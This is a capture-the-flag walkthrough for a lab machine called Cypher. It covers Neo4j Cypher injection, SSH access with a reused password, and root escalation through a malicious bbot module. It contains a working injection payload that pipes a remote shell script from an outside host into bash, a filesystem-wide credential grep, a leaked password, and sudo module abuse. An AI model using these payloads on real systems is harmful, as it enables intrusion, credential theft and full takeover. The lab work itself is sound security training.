# 🗝️ Cypher

## 📝 Overview

The machine involves exploiting a Neo4j database via Cypher injection, retrieving credentials, gaining SSH access, and escalating privileges using a misconfigured Python automation script (bbot).

## 🔍 Enumeration

Initial scanning:
```sh
nmap -p- -T4 10.10.11.57
nmap -sV -sC -p 22,80 10.10.11.57
echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts
```
Directory and file discovery with ffuf:
```sh
ffuf -u http://cypher.htb/FUZZ -w /usr/share/secLists/Discovery/Web-Content/raft-large-files.txt -mc all -fc 404
ffuf -u http://cypher.htb/FUZZ -w /usr/share/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -mc all -fc 404 
ffuf -w /usr/share/secLists/Discovery/DNS/dns-Jhaddix.txt -u http://cypher.htb -H 'Host: FUZZ.cypher.htb' -mc all -fs 154
```
Found interesting API endpoint:
```sh
ffuf -u http://cypher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

## 🕵️‍♂️ Cypher Injection

With Burp Suite, we enumerate the Neo4j database:
```sh
GET /api/cypher?query=MATCH+(n)+RETURN+n+LIMIT+5
GET /api/cypher?query=MATCH+(u:USER)-[:SECRET]->(h:SHA1)+RETURN+u.name,+h.value
# we obtain user graphasm and 9f54ca4c130be6d529a56dee59dc2b2090e43acf (cannot crack)
```
Exploiting the auth endpoint via injection to get a reverse shell:
```http
POST /api/auth HTTP/1.1
Host: cypher.htb
Content-Type: application/json
{
  "username": "' RETURN h.value AS hash UNION CALL custom.getUrlStatusCode(\"dummy; curl http://10.10.14.109:8000/shell.sh | bash\") YIELD statusCode AS hash RETURN hash;//",
  "password": "x"
}
```

## 🔑 Extracting Passwords

Upgrade shell:
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Retrieve local credentials:
```sh
cat /home/graphasm/bbot_preset.yml
grep -iR "password\|passwd" / 2>/dev/null
# neo4j // cU4btyib.20xtCMCXkBmerhK
```

## 🖥️ SSH Access

Login as graphasm using reused password from neo4j:
```sh
ssh graphasm@10.10.11.57
```

## 🧗 Privilege Escalation via Bbot

Check sudo privileges:
```sh
id
groups
sudo -l
file /usr/local/bin/bbot
head -n 20 /usr/local/bin/bbot
ls -l /opt/pipx/venvs/bbot/lib/python3.12/site-packages/bbot/cli.py
```
List potentially dangerous module options:
```sh
/usr/local/bin/bbot --list-module-options | grep -iE 'file|script|eval|cmd|exec'
```
Create preset.yml:
```py
module_dirs:
  - .
modules:
  - evil
```
Create malicious module evil.py:
```py
from bbot.modules import ModuleBase

class EvilModule(ModuleBase):
    def run(self):
        import os
        os.system("/bin/bash")
```
Execute with sudo:
```sh
sudo /usr/local/bin/bbot -t dummy.com -p /tmp/test/preset.yml
```
This spawns a root shell and completes the privilege escalation.  
[Documentation](https://seclists.org/fulldisclosure/2025/Apr/19)
